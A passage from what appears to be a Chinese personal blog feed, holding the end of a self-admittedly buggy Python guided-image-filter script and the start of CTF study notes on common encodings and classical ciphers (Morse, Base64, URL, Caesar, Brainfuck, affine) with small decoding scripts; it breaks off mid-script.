class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/22</span></span><br><span class="line"><span class="string">BUG: 时间复杂度O(m*n*div*r*r)，不可行，另外存在img[]访问问题</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯空间核函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gr</span><span class="params">(px, py, qx, qy, dr)</span>:</span></span><br><span class="line"></span><br><span class="line">   nut = math.exp( - ( pow((qx - px), <span class="number">2</span>) + pow((qy - py), <span class="number">2</span>) ) ) <span class="comment">#分子</span></span><br><span class="line">   det = <span class="number">2</span> * pow(dr, <span class="number">2</span>) <span class="comment">#分母</span></span><br><span class="line">   result =  nut / det  </span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯频域核函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gzeta</span><span class="params">(guide_img, div, px, py, qx, qy, dzeta)</span>:</span></span><br><span class="line"></span><br><span class="line">   guide_img = guide_img </span><br><span class="line">   nut = math.exp( - ( pow( ( guide_img[px, py, div] - guide_img[qx, qy, div] ), <span class="number">2</span> ) ) ) <span class="comment">#分子</span></span><br><span class="line">   det = <span class="number">2</span> * pow(dzeta, <span class="number">2</span>)</span><br><span class="line">   result =  nut / det</span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解高斯空间域滤波，返回指定像素点(p)的输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GS</span><span class="params">(image, r, dr, px, py, div)</span>:</span></span><br><span class="line"></span><br><span class="line">   Upsilon = <span class="number">0</span> <span class="comment">#τ，归一化系数</span></span><br><span class="line">   output = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):<span class="comment"># 以p为中心的窗口半径为2r+1的区域</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):</span><br><span class="line">         Upsilon = Upsilon + gr(px, py, px + i, py + j, dr)</span><br><span class="line">         output = output + gr(px, py, px + i, py + j, dr) * image[px + i,py + j,div]</span><br><span class="line">   </span><br><span class="line">   output = output / Upsilon </span><br><span class="line">   <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解指定窗口(3*3)的中值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">medbox</span><span class="params">(img, x, y, div, length, width)</span>:</span></span><br><span class="line">   </span><br><span class="line">   nums = []</span><br><span class="line">   length = width = <span class="number">3</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(math.floor(length/<span class="number">2</span>), -math.floor(length/<span class="number">2</span>)<span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(math.floor(width/<span class="number">2</span>), -math.floor(width/<span class="number">2</span>)<span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">         nums.append( img[x+i, y+j, div])</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> np.median(nums)</span><br><span class="line"></span><br><span class="line"><span class="comment">#窗口感知的高斯引导滤波</span></span><br><span class="line"><span class="comment">#求解WGGF在每个像素点p的输出并返回</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WGGF</span><span class="params">(guide_img,source,r,dzeta,px,py,div, lam)</span>:</span></span><br><span class="line">   </span><br><span class="line">   guide_img = guide_img </span><br><span class="line">   source = source  </span><br><span class="line">   Upsilon = <span class="number">0</span> <span class="comment">#τ，归一化系数</span></span><br><span class="line">   output = <span class="number">0</span></span><br><span class="line">   flag = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):<span class="comment"># 以p为中心的窗口半径为2r+1的区域</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):</span><br><span class="line">         temp = abs( guide_img[px + i, py + <span class="number">1</span>, div] - guide_img[px, py, div] )</span><br><span class="line">         <span class="keyword">if</span> temp &lt;= lam:</span><br><span class="line">               flag = flag + <span class="number">1</span></span><br><span class="line">               Upsilon = Upsilon + gzeta(guide_img, div, px, py, px+i, py+j, dzeta)</span><br><span class="line">               output = output + guide_img[px + i,py + j,div] * gzeta(guide_img, div, px, py, px+i, py+j, dzeta)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> flag == <span class="number">1</span> <span class="keyword">or</span> Upsilon == <span class="number">0</span>: <span class="comment">#不满足窗口感知的要求，返回3*3窗口中的像素点中值</span></span><br><span class="line">      output = medbox( source, px, py, j, <span class="number">3</span>, <span class="number">3</span> )</span><br><span class="line">   <span class="keyword">else</span>: <span class="comment">#满足条件</span></span><br><span class="line">      output = output / Upsilon </span><br><span class="line">   <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数，测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="comment">#读取图片</span></span><br><span class="line">   img = cv2.imread(<span class="string">'02.png'</span>, <span class="number">1</span>)</span><br><span class="line">   source = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)</span><br><span class="line">   source = source / <span class="number">255.0</span></span><br><span class="line">   guide_img = source</span><br><span class="line">   </span><br><span class="line">   print(<span class="number">1.666</span>)</span><br><span class="line">   <span class="comment">#求解高斯引导滤波</span></span><br><span class="line">   [m ,n, div] = np.shape(source)<span class="comment">#查看矩阵或者数组的维数。</span></span><br><span class="line">   r = <span class="number">5</span> <span class="comment">#窗口半径</span></span><br><span class="line">   dr = <span class="number">0.5</span> <span class="comment">#空域带宽</span></span><br><span class="line">   <span class="comment"># 高斯滤波</span></span><br><span class="line">   guide_img = cv2.GaussianBlur(source, (r,r), dr)</span><br><span class="line">               </span><br><span class="line">   </span><br><span class="line">   print(<span class="number">2.666</span>)</span><br><span class="line">   <span class="comment">#求解WGGF</span></span><br><span class="line">   target = guide_img</span><br><span class="line">   r = <span class="number">5</span> <span class="comment">#窗口半径</span></span><br><span class="line">   dzeta = <span class="number">0.1</span> <span class="comment">#频域带宽</span></span><br><span class="line">   lam = <span class="number">0.12</span> <span class="comment">#λ为一选定的阈值 </span></span><br><span class="line">   num = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> k <span class="keyword">in</span> range(div):</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">               <span class="keyword">if</span> i &lt;= r <span class="keyword">or</span> i &gt;= m - r <span class="keyword">or</span> j &lt;= r <span class="keyword">or</span> j &gt;= n - r: <span class="comment">#图片边界处理(引导像素)</span></span><br><span class="line">                  <span class="keyword">continue</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                  target[i, j, k] = WGGF(guide_img, source, r, dzeta, i, j, k, lam)</span><br><span class="line">               num = num + <span class="number">1</span></span><br><span class="line">               print(num)</span><br><span class="line">   print(<span class="number">3.666</span>)</span><br><span class="line">   <span class="comment">#显示图形</span></span><br><span class="line">   titles = [<span class="string">'Source Image'</span>, <span class="string">'WGGF Image'</span>]  </span><br><span class="line">   images = [source*<span class="number">255.0</span>, target*<span class="number">255.0</span>]  </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):  </span><br><span class="line">      plt.subplot(<span class="number">1</span>, <span class="number">2</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">      plt.title(titles[i])  </span><br><span class="line">      plt.xticks([]),plt.yticks([]) <span class="comment">#禁止输出坐标轴 </span></span><br><span class="line">   plt.show()  </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 未定义 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像光顺 </tag>
            
            <tag> CV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF编码加密整理</title>
      <link href="/2020/07/13/CTF%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/2020/07/13/CTF%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="01-常见编码"><a href="#01-常见编码" class="headerlink" title="01 常见编码"></a>01 常见编码</h1><h2 id="0x01-莫尔斯电码-Morse-Code"><a href="#0x01-莫尔斯电码-Morse-Code" class="headerlink" title="0x01 莫尔斯电码(Morse Code)"></a>0x01 莫尔斯电码(Morse Code)</h2><h3 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　摩尔斯电码也被称作摩斯密码，是一种时通时断的<a href="https://baike.baidu.com/item/信号/32683" target="_blank" rel="noopener">信号</a>代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。</p><h3 id="02-特征"><a href="#02-特征" class="headerlink" title="02 特征"></a>02 特征</h3><ol><li>由<code>. -</code>组成的字符串；</li><li>由<code>0 1</code>组成的字符串，且为空格间隔得一组一组的。</li></ol><h3 id="03-解题"><a href="#03-解题" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li><a href="http://ctf.ssleye.com/morse.html" target="_blank" rel="noopener">通道1(英文字母小写)</a></li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">通道2(英文字母大写)</a></li><li><a href="http://moersima.00cha.net/" target="_blank" rel="noopener">通道3(英文字母小写)</a></li><li>01破解脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">'...'</span></span><br><span class="line">dic= &#123;    <span class="string">'01'</span>: <span class="string">'A'</span>,</span><br><span class="line">        <span class="string">'1000'</span>: <span class="string">'B'</span>,</span><br><span class="line">        <span class="string">'1010'</span>: <span class="string">'C'</span>,</span><br><span class="line">         <span class="string">'100'</span>: <span class="string">'D'</span>,</span><br><span class="line">           <span class="string">'0'</span>: <span class="string">'E'</span>,</span><br><span class="line">        <span class="string">'0010'</span>: <span class="string">'F'</span>,</span><br><span class="line">         <span class="string">'110'</span>: <span class="string">'G'</span>,</span><br><span class="line">        <span class="string">'0000'</span>: <span class="string">'H'</span>,</span><br><span class="line">          <span class="string">'00'</span>: <span class="string">'I'</span>,</span><br><span class="line">        <span class="string">'0111'</span>: <span class="string">'J'</span>,</span><br><span class="line">         <span class="string">'101'</span>: <span class="string">'K'</span>,</span><br><span class="line">        <span class="string">'0100'</span>: <span class="string">'L'</span>,</span><br><span class="line">          <span class="string">'11'</span>: <span class="string">'M'</span>,</span><br><span class="line">          <span class="string">'10'</span>: <span class="string">'N'</span>,</span><br><span class="line">        <span class="string">'111'</span>: <span class="string">'O'</span>,</span><br><span class="line">        <span class="string">'0110'</span>: <span class="string">'P'</span>,</span><br><span class="line">        <span class="string">'1101'</span>: <span class="string">'Q'</span>,</span><br><span class="line">        <span class="string">'010'</span>: <span class="string">'R'</span>,</span><br><span class="line">        <span class="string">'000'</span>: <span class="string">'S'</span>,</span><br><span class="line">        <span class="string">'1'</span>: <span class="string">'T'</span>,</span><br><span class="line">        <span class="string">'001'</span>: <span class="string">'U'</span>,</span><br><span class="line">        <span class="string">'0001'</span>: <span class="string">'V'</span>,</span><br><span class="line">        <span class="string">'011'</span>: <span class="string">'W'</span>,</span><br><span class="line">        <span class="string">'1001'</span>: <span class="string">'X'</span>,</span><br><span class="line">        <span class="string">'1011'</span>: <span class="string">'Y'</span>,</span><br><span class="line">        <span class="string">'1100'</span>: <span class="string">'Z'</span>,</span><br><span class="line">        <span class="string">'01111'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'00111'</span>: <span class="string">'2'</span>,</span><br><span class="line">        <span class="string">'00011'</span>: <span class="string">'3'</span>,</span><br><span class="line">        <span class="string">'00001'</span>: <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'00000'</span>: <span class="string">'5'</span>,</span><br><span class="line">        <span class="string">'10000'</span>: <span class="string">'6'</span>,</span><br><span class="line">        <span class="string">'11000'</span>: <span class="string">'7'</span>,</span><br><span class="line">        <span class="string">'11100'</span>: <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'11110'</span>: <span class="string">'9'</span>,</span><br><span class="line">        <span class="string">'11111'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'001100'</span>: <span class="string">'?'</span>,</span><br><span class="line">        <span class="string">'10010'</span>: <span class="string">'/'</span>,</span><br><span class="line">        <span class="string">'101101'</span>: <span class="string">'()'</span>,</span><br><span class="line">        <span class="string">'100001'</span>: <span class="string">'-'</span>,</span><br><span class="line">        <span class="string">'010101'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'110011'</span>:<span class="string">','</span>,</span><br><span class="line">        <span class="string">'011010'</span>:<span class="string">'@'</span>,</span><br><span class="line">        <span class="string">'111000'</span>:<span class="string">':'</span>,</span><br><span class="line">        <span class="string">'101010'</span>:<span class="string">':'</span>,</span><br><span class="line">        <span class="string">'10001'</span>:<span class="string">'='</span>,</span><br><span class="line">        <span class="string">'011110'</span>:<span class="string">"'"</span>,</span><br><span class="line">        <span class="string">'101011'</span>:<span class="string">'!'</span>,</span><br><span class="line">        <span class="string">'001101'</span>:<span class="string">'_'</span>,</span><br><span class="line">        <span class="string">'010010'</span>:<span class="string">'"'</span>,</span><br><span class="line">        <span class="string">'10110'</span>:<span class="string">'('</span>,</span><br><span class="line">        <span class="string">'1111011'</span>:<span class="string">'&#123;'</span>,</span><br><span class="line">        <span class="string">'1111101'</span>:<span class="string">'&#125;'</span></span><br><span class="line">        &#125;; </span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">    flag += dic[item]</span><br><span class="line">print( flag )</span><br><span class="line">print( flag.lower() )</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-Base64-32-16编码"><a href="#0x02-Base64-32-16编码" class="headerlink" title="0x02 Base64/32/16编码"></a>0x02 Base64/32/16编码</h2><h3 id="01-原理-1"><a href="#01-原理-1" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　base64、base32、base16可以分别编码转化8位字节为6位、5位、4位，16、32、64分别表示用多少个字符来编码。以base64为例：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因。</p><h3 id="02-特征-1"><a href="#02-特征-1" class="headerlink" title="02 特征"></a>02 特征</h3><p>　　有大写、小写、数字，密文末尾一般为<code>==</code>。</p><h3 id="03-解题-1"><a href="#03-解题-1" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li><a href="http://ctf.ssleye.com/base64.html" target="_blank" rel="noopener">通道1</a></li><li><a href="https://tool.bugku.com/safe/base64.php" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x03-Escape-Unescape编码"><a href="#0x03-Escape-Unescape编码" class="headerlink" title="0x03 Escape/Unescape编码"></a>0x03 Escape/Unescape编码</h2><h3 id="01-原理-2"><a href="#01-原理-2" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><h3 id="02-特征-2"><a href="#02-特征-2" class="headerlink" title="02 特征"></a>02 特征</h3><p>　　密文中含有<code>%u</code>。</p><h3 id="03-解题-2"><a href="#03-解题-2" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li><a href="http://ctf.ssleye.com/escape.html" target="_blank" rel="noopener">通道1</a></li><li>工具Converter：Unescape</li></ul><hr><h2 id="0x04-HTML编码"><a href="#0x04-HTML编码" class="headerlink" title="0x04 HTML编码"></a>0x04 HTML编码</h2><h3 id="01-原理-3"><a href="#01-原理-3" class="headerlink" title="01 原理"></a>01 原理</h3><p>完整编码手册：<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">我跳</a></p><h3 id="02-特征-3"><a href="#02-特征-3" class="headerlink" title="02 特征"></a>02 特征</h3><p>由元素<code>&amp;#x26;</code>构成，26可为别的数字。</p><h3 id="03-解题-3"><a href="#03-解题-3" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li><a href="http://ctf.ssleye.com/html_en.html" target="_blank" rel="noopener">通道1</a></li><li><a href="https://tool.chinaz.com/tools/htmlencode.aspx" target="_blank" rel="noopener">通道2</a></li><li>工具Converter：Decode HTML</li></ul><hr><h2 id="0x05-Unicode编码"><a href="#0x05-Unicode编码" class="headerlink" title="0x05 Unicode编码"></a>0x05 Unicode编码</h2><h3 id="01-原理-4"><a href="#01-原理-4" class="headerlink" title="01 原理"></a>01 原理</h3><p>Unicode编码有以下四种编码方式：</p><ul><li>源文本： <code>The</code></li><li>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></li><li>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></li><li>\U [Hex]： <code>\U0054\U0068\U0065</code></li><li>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code>　　</li></ul><h3 id="02-解题"><a href="#02-解题" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="https://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">通道1</a></li><li><a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x06-URL编码"><a href="#0x06-URL编码" class="headerlink" title="0x06 URL编码"></a>0x06 URL编码</h2><h3 id="01-原理-5"><a href="#01-原理-5" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><h3 id="02-解题-1"><a href="#02-解题-1" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="https://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">通道1</a></li><li><a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">通道2</a></li></ul><hr><h1 id="02-代换密码"><a href="#02-代换密码" class="headerlink" title="02 代换密码"></a>02 代换密码</h1><h2 id="0x01-凯撒密码-Caesar-Cipher"><a href="#0x01-凯撒密码-Caesar-Cipher" class="headerlink" title="0x01 凯撒密码(Caesar Cipher)"></a>0x01 凯撒密码(Caesar Cipher)</h2><h3 id="01-原理-6"><a href="#01-原理-6" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。</p><ul><li><strong>加密</strong>：$c=E_3(m)=m+3(\bmod 26)　0\leq m\leq 25$</li><li><strong>解密</strong>：$m=D_3(c)=c-3(\bmod 26)　0\leq c\leq 25$</li></ul><p>凯撒有两种编码脚本，一种是字母26内循环移位，一种是127次非字母内的循环移位。</p><h3 id="02-样例"><a href="#02-样例" class="headerlink" title="02 样例"></a>02 样例</h3><ul><li>c =  xyz</li><li>m = abc</li></ul><h3 id="03-解题-4"><a href="#03-解题-4" class="headerlink" title="03 解题"></a>03 解题</h3><ul><li>CTFcrackTools工具(所有结果罗列)</li><li><a href="http://ctf.ssleye.com/caesar.html" target="_blank" rel="noopener">通道2(单个情况)</a></li><li>127次非字母内的循环移位脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">"""..."""</span> <span class="comment">#密文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">    m = <span class="string">''</span> <span class="comment">#明文</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        temp = chr( (ord(i) + p) % <span class="number">127</span> )</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt; ord(temp) &lt; <span class="number">127</span>:</span><br><span class="line">            m += temp</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'****%d****:'</span>%p, m)</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-Brainfuck加密"><a href="#0x02-Brainfuck加密" class="headerlink" title="0x02 Brainfuck加密"></a>0x02 Brainfuck加密</h2><h3 id="01-原理-7"><a href="#01-原理-7" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf＊ck或brainf＊＊k，甚至被简称为BF。brainfuck语言用<code>&gt; &lt; + - . , [ ]</code>八种符号来替换C语言的各种语法和命令。</p><h3 id="02-解题-2"><a href="#02-解题-2" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x03-Ook加密"><a href="#0x03-Ook加密" class="headerlink" title="0x03 Ook加密"></a>0x03 Ook加密</h2><h3 id="01-原理-8"><a href="#01-原理-8" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　Ook密码中只含<code>Ook. Ook? Ook!</code>三个不同的语法元素。</p><h3 id="02-解题-3"><a href="#02-解题-3" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x04-加密"><a href="#0x04-加密" class="headerlink" title="0x04 .!?加密"></a>0x04 .!?加密</h2><h3 id="01-原理-9"><a href="#01-原理-9" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　.!?密码中只含<code>. ? !</code>三个不同的语法元素，使用Ook解密即可。</p><h3 id="02-解题-4"><a href="#02-解题-4" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="https://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">通道1</a></li><li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x05-社会主义核心价值观"><a href="#0x05-社会主义核心价值观" class="headerlink" title="0x05 社会主义核心价值观"></a>0x05 社会主义核心价值观</h2><h3 id="01-原理-10"><a href="#01-原理-10" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　富强、民主、文明、和谐，自由、平等、公正、法治，爱国、敬业、诚信、友善。</p><h3 id="02-解题-5"><a href="#02-解题-5" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><a href="http://ctf.ssleye.com/cvencode.html" target="_blank" rel="noopener">通道1</a></li><li><a href="http://www.atoolbox.net/Tool.php?Id=850" target="_blank" rel="noopener">通道2</a></li></ul><hr><h2 id="0x06-标准银河字母"><a href="#0x06-标准银河字母" class="headerlink" title="0x06 标准银河字母"></a>0x06 标准银河字母</h2><h3 id="01-原理-11"><a href="#01-原理-11" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　标准银河字母（Standard Galactic Alphabet）出自游戏《<a href="https://baike.baidu.com/item/指挥官基恩/10345602" target="_blank" rel="noopener">指挥官基恩</a>》系列。是系列中使用的书写系统。字母对应如下：</p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/eac4b74543a98226aab284e78a82b9014b90ebfb.png" class="lozad"></p><hr><h2 id="0x07-仿射加密"><a href="#0x07-仿射加密" class="headerlink" title="0x07 仿射加密"></a>0x07 仿射加密</h2><h3 id="01-原理-12"><a href="#01-原理-12" class="headerlink" title="01 原理"></a>01 原理</h3><p>　　仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p><ul><li><strong>加密</strong>：$c = E_{a,b}(m) \equiv am+b(\bmod 26)$</li><li><strong>解密</strong>：$m = D_{a,b} \equiv a^{-1}(c-d)(\bmod 26)$</li></ul><p>　　其中，a、b是密钥，为满足$0\leq a,b\leq 25$和$gcd(a,26) = 1$的整数。其中$gcd(a,26) = 1$表示a和26的最大公因子，$a<em>{-1}$表示a的逆元，即$a</em>{-1}*a \equiv 1(\mod26)$。</p><h3 id="02-解题-6"><a href="#02-解题-6" class="headerlink" title="02 解题"></a>02 解题</h3><ul><li><strong>常规解法</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = ... <span class="comment">#密钥</span></span><br><span class="line">b = ... <span class="comment">#密钥</span></span><br><span class="line">text = <span class="string">"..."</span> <span class="comment">#密文</span></span><br><span class="line">flag = <span class="string">""</span>    <span 